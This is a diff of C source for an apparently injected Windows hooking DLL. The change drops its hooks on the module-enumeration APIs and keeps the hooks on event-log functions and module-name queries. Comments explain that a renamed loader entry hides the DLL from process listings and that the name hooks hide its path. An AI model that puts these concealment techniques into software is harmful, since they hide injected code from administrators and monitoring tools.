@@ -268,16 +268,11 @@ static const WsHookTarget g_targets[] = {
     WS_TARGET(ReadEventLogA),
     WS_TARGET(GetNumberOfEventLogRecords),
     WS_TARGET(CloseEventLog),
-    /* Transparency: `tasklist /m` / Get-Process -Module enumerate our own DLL. */
-    WS_TARGET(EnumProcessModules),
-    WS_TARGET(EnumProcessModulesEx),
-    WS_TARGET(K32EnumProcessModules),
-    WS_TARGET(K32EnumProcessModulesEx),
-    WS_TARGET(Module32FirstW),
-    WS_TARGET(Module32NextW),
-    WS_TARGET(Module32First),
-    WS_TARGET(Module32Next),
-    /* Cross-process module NAME (the list itself may be unfilterable). */
+    /* NOTE: the module LIST is not filtered. `tasklist /m` reads the PEB loader
+     * list (never these APIs), so the renamed BaseDllName is what actually hides
+     * us; filtering the array only made the injected helper unable to find its
+     * own shim module (it scanned the list and we removed the entry it needed). */
+    /* Cross-process module NAME (hides the plugin path in listings). */
     WS_TARGET(GetModuleBaseNameW),
     WS_TARGET(GetModuleBaseNameA),
     WS_TARGET(GetModuleFileNameExW),
@@ -363,9 +358,6 @@ static const char *const g_targetNames[] = {
     "EvtClearLog", "EvtQuery", "EvtNext", "EvtClose",
     "OpenEventLogW", "OpenEventLogA", "ClearEventLogW", "ClearEventLogA",
     "ReadEventLogW", "ReadEventLogA", "GetNumberOfEventLogRecords", "CloseEventLog",
-    "EnumProcessModules", "EnumProcessModulesEx",
-    "K32EnumProcessModules", "K32EnumProcessModulesEx",
-    "Module32FirstW", "Module32NextW", "Module32First", "Module32Next",
     "GetModuleBaseNameW", "GetModuleBaseNameA",
     "GetModuleFileNameExW", "GetModuleFileNameExA",
     "K32GetModuleBaseNameW", "K32GetModuleBaseNameA",
